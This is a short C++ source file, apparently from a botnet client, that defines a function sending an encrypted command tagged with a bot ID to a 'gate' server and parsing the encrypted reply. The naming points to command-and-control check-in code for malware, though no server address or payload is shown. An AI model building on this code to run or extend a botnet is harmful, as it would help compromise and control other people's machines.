#include "gate.h"
#include "inet.h"
#include "gen_id.h"

BOOL SendToGate(DWORD cmd, cmem & option, proto2 & st)
{
	DWORD bid = GetBotId();
	cmem send, answer;
	FormatCommand(bid,cmd,option,send);
	EncryptCommand(send);
	if (PostData(send.data, send.size, answer))
	{
		EncryptCommand(answer);
		if (ParseProto(answer,st))
			return true;
	}
	return false;
}

